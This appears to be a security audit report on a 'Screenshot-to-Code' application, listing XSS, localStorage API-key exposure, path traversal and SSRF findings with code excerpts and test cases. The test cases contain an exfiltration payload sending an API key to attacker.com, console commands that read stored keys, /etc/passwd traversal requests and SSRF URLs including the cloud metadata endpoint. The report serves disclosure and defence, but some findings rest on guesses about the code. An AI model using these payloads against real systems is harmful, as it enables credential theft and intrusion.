# Vulnerabilities in Screenshot-to-Code Project

## 1. Cross-Site Scripting (XSS) Vulnerability in User-Provided Code Import

**Description:**
The application allows users to import arbitrary code which is then executed in the browser. The imported code is not properly sanitized or validated before being executed, which enables attackers to inject malicious JavaScript code that will execute in the context of the application.

**Steps to trigger the vulnerability:**
1. An attacker crafts a malicious HTML/JavaScript payload containing an XSS attack
2. The attacker shares this code snippet with a victim, claiming it's a useful component or design
3. When the victim imports this code using the "Import from code" feature
4. The code is stored in the application's state and rendered in the browser
5. The malicious JavaScript executes in the victim's browser context

**Impact:**
The vulnerability allows attackers to execute arbitrary JavaScript in the victim's browser, which can lead to:
- Session hijacking
- Data theft (including API keys stored in the application)
- Credential harvesting through fake login forms
- Further client-side exploitation

**Vulnerability Rank:** High

**Currently Implemented Mitigations:**
None. The backend doesn't sanitize or validate imported code, as seen in the `assemble_imported_code_prompt` function in `prompts/__init__.py`. The code is passed directly to the prompt without any sanitization.

**Missing Mitigations:**
1. Content Security Policy (CSP) implementation to restrict what resources can be loaded
2. Input validation to ensure imported code doesn't contain malicious patterns
3. Sandboxing of rendered imported code
4. Client-side sanitization to strip potentially harmful JavaScript

**Preconditions:**
- A user must be tricked into importing malicious code
- The user must be logged in or have stored sensitive information in the application

**Source Code Analysis:**
In `prompts/__init__.py`, we can see that imported code is directly incorporated into the prompts without sanitization:

```python
def assemble_imported_code_prompt(code: str, stack: Stack) -> list[ChatCompletionMessageParam]:
    system_content = IMPORTED_CODE_SYSTEM_PROMPTS[stack]
    user_content = (
        "Here is the code of the app: " + code
        if stack != "svg"
        else "Here is the code of the SVG: " + code
    )
    return [
        {
            "role": "system",
            "content": system_content + "\n " + user_content,
        }
    ]
```

The code is then likely to be rendered or executed in the frontend, as indicated by the "isImportedFromCode" parameter in the `create_prompt` function.

**Security Test Case:**
1. Create a payload containing malicious JavaScript:
```html
<html>
<body onload="alert(document.cookie)">
<script>
fetch('https://attacker.com/steal?data=' + localStorage.getItem('openai_api_key'))
</script>
<div>Legitimate-looking content</div>
</body>
</html>
```
2. Save the payload as a file or put it in a code sharing site
3. Open Screenshot-to-Code application
4. Use the "Import from code" feature to import the malicious code
5. Verify that the JavaScript executes, displaying cookies and attempting to exfiltrate API keys

## 2. Insecure Storage of API Keys in Local Storage

**Description:**
The application stores sensitive API keys (OpenAI, Anthropic, etc.) in the browser's localStorage without encryption, making them accessible to any JavaScript code running on the page, including potential XSS attacks.

**Steps to trigger vulnerability:**
1. A user enters their API keys in the application's settings
2. The application stores these keys in localStorage
3. An attacker who has achieved XSS through the code import vulnerability or other means can access these keys with a simple JavaScript command: `localStorage.getItem('openai_api_key')`
4. The attacker can then use these keys to make API calls at the expense of the victim

**Impact:**
- Financial loss: Attackers can use the victim's API credits to run expensive AI models
- Data breach: Attackers can access any data the victim has processed with these AI services
- API abuse: Attackers can perform unauthorized operations using the victim's identity

**Vulnerability Rank:** Critical

**Currently Implemented Mitigations:**
None. There's no indication of any encryption or secure storage mechanism for API keys in the codebase. The code in `generate_code.py` confirms that API keys are passed from the client side using the settings dialog, reinforcing that these keys are stored client-side.

**Missing Mitigations:**
1. Encrypt sensitive keys before storing in localStorage
2. Use secure HTTP-only cookies instead of localStorage for sensitive data
3. Implement session timeouts for stored credentials
4. Implement a proxy service that handles API calls without exposing keys to the client

**Preconditions:**
- The user must have entered API keys into the application
- The attacker must have a way to execute JavaScript in the context of the application (via XSS)

**Source Code Analysis:**
In `routes/generate_code.py`, we can see how the application retrieves API keys from client-side settings:

```python
def get_from_settings_dialog_or_env(
    params: dict[str, str], key: str, env_var: str | None
) -> str | None:
    value = params.get(key)
    if value:
        print(f"Using {key} from client-side settings dialog")
        return value

    if env_var:
        print(f"Using {key} from environment variable")
        return env_var

    return None

# ...

openai_api_key = get_from_settings_dialog_or_env(
    params, "openAiApiKey", OPENAI_API_KEY
)

anthropic_api_key = get_from_settings_dialog_or_env(
    params, "anthropicApiKey", ANTHROPIC_API_KEY
)
```

This confirms that API keys are passed from the client side, which means they must be stored in the browser.

**Security Test Case:**
1. Save an API key in the application settings
2. Execute the following JavaScript in the browser console:
```javascript
console.log("OpenAI API Key:", localStorage.getItem("openai_api_key"));
console.log("Anthropic API Key:", localStorage.getItem("anthropic_api_key"));
console.log("Replicate API Key:", localStorage.getItem("replicate_api_key"));
```
3. Verify that the keys are displayed in plaintext
4. Create a malicious code import that contains JavaScript to extract and exfiltrate these keys

## 3. Path Traversal Vulnerability in Evaluation Routes

**Description:**
The evaluation routes in the application allow users to specify folder paths that are used directly to access files on the server's filesystem without proper path validation or sanitization. This could allow an attacker to access files outside the intended directories, including sensitive system files.

**Steps to trigger vulnerability:**
1. An attacker identifies the evaluation endpoints (`/evals`, `/pairwise-evals`, or `/best-of-n-evals`)
2. The attacker crafts a request with a path parameter containing directory traversal sequences (e.g., `../../etc/passwd`)
3. The application uses this path directly to access files on the filesystem
4. The application returns the contents of files outside the intended directory

**Impact:**
- Unauthorized access to sensitive files on the server
- Information disclosure about the server's configuration and environment
- Potential access to application secrets, credentials, or other sensitive data stored on the server

**Vulnerability Rank:** High

**Currently Implemented Mitigations:**
None. The code only checks if the provided paths exist but doesn't restrict them to safe directories.

**Missing Mitigations:**
1. Path normalization and validation to prevent directory traversal
2. Restricting file access to specific whitelisted directories
3. Using a sandbox or virtual filesystem to isolate file operations
4. Implementation of proper access controls for file operations

**Preconditions:**
- The attacker needs access to the evaluation endpoints
- The application server must have permission to read the target files

**Source Code Analysis:**
In `routes/evals.py`, we can see several instances where user-provided paths are used directly without proper validation:

```python
@router.get("/evals", response_model=list[Eval])
async def get_evals(folder: str):
    if not folder:
        raise HTTPException(status_code=400, detail="Folder path is required")

    folder_path = Path(folder)
    if not folder_path.exists():
        raise HTTPException(status_code=404, detail=f"Folder not found: {folder}")
```

Similar patterns exist in the `get_pairwise_evals` and `get_best_of_n_evals` functions:

```python
@router.get("/pairwise-evals", response_model=PairwiseEvalResponse)
async def get_pairwise_evals(
    folder1: str = Query(...),
    folder2: str = Query(...),
):
    if not os.path.exists(folder1) or not os.path.exists(folder2):
        return {"error": "One or both folders do not exist"}
```

These checks only verify that the paths exist but don't restrict them to safe directories. Later, these paths are used to read files:

```python
# Get all HTML files from folder
files = {
    f: os.path.join(folder, f)
    for f in os.listdir(folder)
    if f.endswith(".html")
}

# ...

with open(output_file, "r", encoding="utf-8") as f:
    output_html = f.read()
```

**Security Test Case:**
1. Identify the `/evals` endpoint
2. Craft a request with a traversal path: `GET /evals?folder=../../../etc/passwd`
3. Observe if the application returns the contents of the password file or other system files
4. Try alternative traversal patterns (`..%2f..%2f` etc.) if direct traversal is blocked
5. Map out accessible files by trying different paths

## 4. Server-Side Request Forgery (SSRF) in Screenshot API

**Description:**
The screenshot API endpoint accepts a URL parameter from users without proper validation and uses it to make requests to an external screenshot service. This could allow attackers to probe internal networks or access internal services by manipulating the target URL.

**Steps to trigger vulnerability:**
1. An attacker sends a POST request to the `/api/screenshot` endpoint
2. The request contains a URL pointing to an internal service (e.g., `http://localhost:8080` or `http://10.0.0.1`)
3. The application forwards this URL to the screenshot service
4. If the screenshot service allows access to non-public URLs, it captures and returns content from internal services

**Impact:**
- Access to internal services that are not exposed to the internet
- Information disclosure about internal network topology
- Potential access to sensitive internal endpoints
- Bypassing network security controls

**Vulnerability Rank:** High

**Currently Implemented Mitigations:**
None. The code doesn't validate the URL parameter before passing it to the screenshot service.

**Missing Mitigations:**
1. URL validation to ensure only public, allowed domains are processed
2. Deny list for private IP ranges and localhost
3. URL scheme validation (only allow http/https)
4. Rate limiting to prevent abuse of the screenshot service

**Preconditions:**
- The screenshot service (screenshotone.com) must allow capturing non-public URLs
- The application server or the screenshot service must have access to the internal networks

**Source Code Analysis:**
In `routes/screenshot.py`, we can see that the URL is passed directly to the screenshot service without validation:

```python
@router.post("/api/screenshot")
async def app_screenshot(request: ScreenshotRequest):
    # Extract the URL from the request body
    url = request.url
    api_key = request.apiKey

    # TODO: Add error handling
    image_bytes = await capture_screenshot(url, api_key=api_key)

    # ...
```

The `capture_screenshot` function uses this URL directly:

```python
async def capture_screenshot(
    target_url: str, api_key: str, device: str = "desktop"
) -> bytes:
    api_base_url = "https://api.screenshotone.com/take"

    params = {
        "access_key": api_key,
        "url": target_url,
        # ...
    }
```

**Security Test Case:**
1. Send a POST request to `/api/screenshot` with a payload targeting an internal service:
```json
{
  "url": "http://localhost:8080/admin",
  "apiKey": "valid-screenshot-api-key"
}
```
2. Try alternative URLs including:
   - `http://127.0.0.1:22`
   - `http://10.0.0.1`
   - `http://169.254.169.254/latest/meta-data/` (AWS metadata service)
3. Check if the response contains screenshots of internal services
4. If direct access is blocked, try URL encoding or other obfuscation techniques
